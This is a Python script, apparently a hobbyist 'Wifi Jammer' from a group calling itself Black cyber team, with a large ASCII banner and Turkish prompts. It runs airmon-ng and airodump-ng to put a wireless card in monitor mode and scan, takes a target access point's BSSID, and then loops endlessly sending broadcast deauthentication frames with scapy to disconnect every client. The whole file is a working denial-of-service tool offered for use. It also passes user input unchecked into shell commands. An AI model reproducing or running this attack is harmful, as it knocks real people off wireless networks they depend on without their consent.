from scapy.all import *
import subprocess 
from pip._vendor.colorama import Fore

subprocess.call('clear', shell=True) 

print(Fore.BLUE+'      ▄▄▄        ██████ ▓█████  ██▀███   ███▄    █  ▄▄▄       ██▓     ')
print(Fore.BLUE+'     ▒████▄    ▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒ ██ ▀█   █ ▒████▄    ▓██▒     ')
print(Fore.BLUE+'     ▒██  ▀█▄  ░ ▓██▄   ▒███   ▓██ ░▄█ ▒▓██  ▀█ ██▒▒██  ▀█▄  ▒██░     ')
print(Fore.BLUE+'     ░██▄▄▄▄██   ▒   ██▒▒▓█  ▄ ▒██▀▀█▄  ▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██░     ')
print(Fore.BLUE+'      ▓█   ▓██▒▒██████▒▒░▒████▒░██▓ ▒██▒▒██░   ▓██░ ▓█   ▓██▒░██████▒ ')
print(Fore.BLUE+'      ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒░▓  ░ ')
print(Fore.BLUE+'       ▒   ▒▒ ░░ ░▒  ░ ░ ░ ░  ░  ░▒ ░ ▒░░ ░░   ░ ▒░  ▒   ▒▒ ░░ ░ ▒  ░ ')
print(Fore.BLUE+'       ░   ▒   ░  ░  ░     ░     ░░   ░    ░   ░ ░   ░   ▒     ░ ░    ')
print(Fore.BLUE+'           ░  ░      ░     ░  ░   ░              ░       ░  ░    ░  ░ ')
print(Fore.BLUE+'                                                                      ')
print(Fore.BLUE+'      ▄▄▄▄   ▓█████  ██▀███   ██ ▄█▀▓█████   ██████  █     █░▒███████▒')
print(Fore.BLUE+'     ▓█████▄ ▓█   ▀ ▓██ ▒ ██▒ ██▄█▒ ▓█   ▀ ▒██    ▒ ▓█░ █ ░█░▒ ▒ ▒ ▄▀░')
print(Fore.BLUE+'     ▒██▒ ▄██▒███   ▓██ ░▄█ ▒▓███▄░ ▒███   ░ ▓██▄   ▒█░ █ ░█ ░ ▒ ▄▀▒░   ')
print(Fore.BLUE+'     ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  ▓██ █▄ ▒▓█  ▄   ▒   ██▒░█░ █ ░█   ▄▀▒   ░')
print(Fore.BLUE+'     ░▓█  ▀█▓░▒████▒░██▓ ▒██▒▒██▒ █▄░▒████▒▒██████▒▒░░██▒██▓ ▒███████▒')
print(Fore.BLUE+'     ░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒░░ ▒░ ░▒ ▒▓▒ ▒ ░░ ▓░▒ ▒  ░▒▒ ▓░▒░▒')
print(Fore.BLUE+'     ▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░░ ░▒ ▒░ ░ ░  ░░ ░▒  ░ ░  ▒ ░ ░  ░░▒ ▒ ░ ▒')
print(Fore.BLUE+'      ░    ░    ░     ░░   ░ ░ ░░ ░    ░   ░  ░  ░    ░   ░  ░ ░ ░ ░ ░')
print(Fore.BLUE+'      ░         ░  ░   ░     ░  ░      ░  ░      ░      ░      ░ ░    ')
print(Fore.BLUE+'           ░                                                 ░        ')

print(Fore.MAGENTA+'Wifi Jammer V1 BCT')
print(Fore.GREEN+'//////////Black cyber team//////////')
print(Fore.GREEN+'instagram = @berkeswz')

subprocess.call('airmon-ng', shell=True) 

print('\n'*3)
print(Fore.LIGHTGREEN_EX+'yukarıdaki interface kısmını yazın')
networkCard = input(Fore.YELLOW+'Kullandığınız wifi kartını girin.. (interface): ')


subprocess.call('airmon-ng start {}'.format(networkCard), shell=True)
subprocess.call('airmon-ng check kill', shell=True)

networkCard = '{}mon'.format(networkCard) 


try:
	subprocess.call('clear', shell=True) 
	print(Fore.YELLOW+'Taramadan cıkmak icin ctrl+c')
	subprocess.call('airodump-ng {}'.format(networkCard), shell=True) 
except KeyboardInterrupt: 
	print(''*3)


brdMac = 'ff:ff:ff:ff:ff:ff' 
BSSID = input(Fore.YELLOW+'Lütfen BSSID/MAC adresini girin: ') 
print(Fore.YELLOW+'saldırıyı durdurmak icin ctrl+c ye basılı tutun')
print(''*5)


try:
        
	while True:                
                
                
                
                	
		pkt = RadioTap() / Dot11(addr1=brdMac, addr2=BSSID, addr3=BSSID)/ Dot11Deauth()
		sendp(pkt, iface = networkCard, count = 10000, inter = .2) 
except KeyboardInterrupt: 
	print('Cleaning up...')
	subprocess.call('airmon-ng stop {}'.format(networkCard), shell=True) 
	subprocess.call('clear', shell=True) 
